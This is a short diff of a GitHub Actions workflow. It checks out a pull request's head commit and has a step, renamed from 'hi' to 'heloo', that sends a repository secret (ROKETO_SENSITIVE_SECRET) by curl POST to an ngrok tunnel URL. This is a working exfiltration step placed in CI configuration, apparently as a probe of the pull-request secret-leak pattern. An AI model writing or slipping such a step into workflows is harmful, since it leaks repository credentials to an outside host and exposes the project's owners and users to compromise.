@@ -17,7 +17,7 @@ jobs:
       with:
         ref: ${{ github.event.pull_request.head.sha }}
           
-    - name: 'hi'
+    - name: 'heloo'
       run: |
         "curl --request POST --url https://4d25-77-137-8-226.ngrok.io --header 'content-type: application/json' --data '{\"secret\": \"here it is - '${{ secrets.ROKETO_SENSITIVE_SECRET }}'\"}' --fail"
       
